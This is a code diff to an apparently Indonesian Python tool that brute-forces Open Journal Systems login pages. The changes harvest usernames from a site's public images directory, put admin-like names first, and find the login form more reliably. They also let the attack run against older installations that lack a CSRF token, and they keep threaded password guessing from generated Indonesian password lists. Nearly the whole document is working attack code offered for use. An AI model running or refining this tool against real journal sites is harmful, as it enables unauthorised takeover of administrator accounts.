@@ -194,8 +194,9 @@ def extract_usernames(url):
                 if href and not href.endswith(('.', '..')) and href != '':
                     basename = href.split('/')[-1]
                     if basename and not basename.startswith('.') and basename != 'site':
-                        if len(basename) > 1 and not basename.isdigit():
-                            usernames.append(basename)
+                        if not basename.startswith('?'):
+                            if len(basename) > 1 and not basename.isdigit():
+                                usernames.append(basename)
             return list(set(usernames))
         else:
             print(f"{Colors.RED}{Colors.BOLD}Failed to retrieve directory listing. Status code: {response.status_code}{Colors.RESET}")
@@ -212,6 +213,7 @@ def get_csrf_token_and_action(login_url):
             soup = BeautifulSoup(response.text, 'html.parser')
             
             form = soup.find('form', {'id': 'login'})
+            
             if not form:
                 forms = soup.find_all('form')
                 for f in forms:
@@ -219,10 +221,26 @@ def get_csrf_token_and_action(login_url):
                         form = f
                         break
             
+            if not form:
+                forms = soup.find_all('form')
+                for f in forms:
+                    inputs = f.find_all('input')
+                    has_username = any(inp.get('name') == 'username' for inp in inputs)
+                    has_password = any(inp.get('name') == 'password' for inp in inputs)
+                    if has_username and has_password:
+                        form = f
+                        break
+            
             if form:
                 action_url = form.get('action', '')
                 csrf_input = form.find('input', {'name': 'csrfToken'})
                 csrf_token = csrf_input.get('value') if csrf_input else None
+                
+                if not csrf_token:
+                    form_inputs = form.find_all('input')
+                    csrf_found = any(inp.get('name') == 'csrfToken' for inp in form_inputs)
+                    if not csrf_found:
+                        print(f"{Colors.YELLOW}Form OJS lama terdeteksi - tidak menggunakan CSRF token{Colors.RESET}")
                 
                 if not action_url:
                     action_url = login_url.rstrip()
@@ -264,12 +282,13 @@ def brute_force_worker(username, passwords, action_url, csrf_token, results, loc
             print(f"{Colors.YELLOW}{Colors.BOLD}[{username}] Trying password: {password}{Colors.RESET}")
             
             login_data = {
-                'csrfToken': csrf_token,
-                'source': '',
                 'username': username,
                 'password': password,
                 'remember': 1
             }
+            
+            if csrf_token:
+                login_data['csrfToken'] = csrf_token
 
             response = requests.post(
                 action_url.rstrip(),
@@ -324,7 +343,7 @@ def extract_base_url(login_url):
     return login_url
 
 def prioritize_admin_usernames(usernames):
-    admin_keywords = ["admin", "mimin", "atmin", "min", "jurnal", "root", "superuser", "administrator", "ojs", "journal"]
+    admin_keywords = ["admin", "mimin", "atmin", "min", "jurnal", "adminojs", "adminjurnal", "adminjournal", "root", "superuser", "administrator", "ojs", "journal"]
     
     admin_usernames = []
     regular_usernames = []
@@ -346,7 +365,7 @@ def generate_indonesian_passwords():
 
 def main():
     print_banner()
-    login_url = input("Target Login (eg: https://ojs.target.com/index.php/index/login     ): ")
+    login_url = input("Target Login (eg: https://ojs.target.com/index.php/index/login): ")
     base_url = extract_base_url(login_url)
     images_url = f"{base_url}/public/site/images"
     
@@ -387,8 +406,8 @@ def main():
 
     print(f"{Colors.GRAY}Retrieving CSRF token and action URL...{Colors.RESET}")
     action_url, csrf_token = get_csrf_token_and_action(login_url)
-    if not action_url or not csrf_token:
-        print(f"{Colors.RED}Failed to get CSRF token and action URL.{Colors.RESET}")
+    if not action_url:
+        print(f"{Colors.RED}Failed to get action URL.{Colors.RESET}")
         return
 
     try:
@@ -406,7 +425,6 @@ def main():
     with ThreadPoolExecutor(max_workers=threads) as executor:
         future_to_username = {}
         for username in selected_usernames:
-            # Generate always generate list for this target
             always_generate_list = generate_always_generate_list(login_url)
             
             user_passwords = []
